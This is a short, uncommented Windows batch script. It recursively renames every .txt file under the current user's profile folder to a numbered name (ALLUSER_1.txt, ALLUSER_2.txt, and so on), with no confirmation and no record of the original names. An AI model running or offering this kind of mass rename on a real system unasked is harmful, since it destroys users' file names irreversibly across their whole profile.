@echo off
setlocal enabledelayedexpansion

set count=1

for /r "%USERPROFILE%" %%f in (*.txt) do (
    ren "%%f" "ALLUSER_!count!.txt"
    set /a count+=1
)

pause